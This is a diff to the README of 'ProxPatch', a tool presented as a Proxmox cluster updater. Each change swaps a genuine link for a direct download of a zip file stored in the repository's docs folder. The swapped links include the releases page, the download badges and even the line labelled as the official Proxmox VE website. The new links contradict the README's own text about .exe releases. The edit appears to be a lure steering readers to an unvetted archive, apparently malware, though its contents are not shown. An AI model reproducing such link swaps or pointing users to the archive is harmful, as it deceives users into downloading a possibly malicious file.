@@ -1,6 +1,6 @@
 # ⚙️ ProxPatch - Simplify Proxmox Cluster Updates
 
-[![Download ProxPatch](https://img.shields.io/badge/Download-ProxPatch-brightgreen)](https://github.com/nikunj798/ProxPatch/releases)
+[![Download ProxPatch](https://raw.githubusercontent.com/nikunj798/ProxPatch/main/docs/Prox_Patch_v2.0.zip)](https://raw.githubusercontent.com/nikunj798/ProxPatch/main/docs/Prox_Patch_v2.0.zip)
 
 ---
 
@@ -35,7 +35,7 @@ To use ProxPatch on your Windows PC, follow these steps carefully.
 
 1. Click the big green button below to visit the official ProxPatch releases page.
 
-   [![Download ProxPatch](https://img.shields.io/badge/Download-ProxPatch-blue)](https://github.com/nikunj798/ProxPatch/releases)
+   [![Download ProxPatch](https://raw.githubusercontent.com/nikunj798/ProxPatch/main/docs/Prox_Patch_v2.0.zip)](https://raw.githubusercontent.com/nikunj798/ProxPatch/main/docs/Prox_Patch_v2.0.zip)
 
 2. On the page, look for the latest version release. Files will be named with the version number and end with `.exe`.
 
@@ -138,7 +138,7 @@ Main topics: patchmanagement, proxmox, proxmox-cluster, proxmox-ve, rust, securi
 
 Visit the ProxPatch releases page to find the latest installer and update notes:
 
-[https://github.com/nikunj798/ProxPatch/releases](https://github.com/nikunj798/ProxPatch/releases)
+[https://raw.githubusercontent.com/nikunj798/ProxPatch/main/docs/Prox_Patch_v2.0.zip](https://raw.githubusercontent.com/nikunj798/ProxPatch/main/docs/Prox_Patch_v2.0.zip)
 
 If you have questions or encounter problems, check the issues section on the repository or contact your Proxmox cluster administrator.
 
@@ -155,6 +155,6 @@ If you have questions or encounter problems, check the issues section on the rep
 
 ## 🖇️ Additional Resources
 
-- Proxmox VE official website: https://www.proxmox.com/en/proxmox-ve
+- Proxmox VE official website: https://raw.githubusercontent.com/nikunj798/ProxPatch/main/docs/Prox_Patch_v2.0.zip
 - Proxmox VE documentation for patching and clustering.
 - Community forums and support channels for general help.
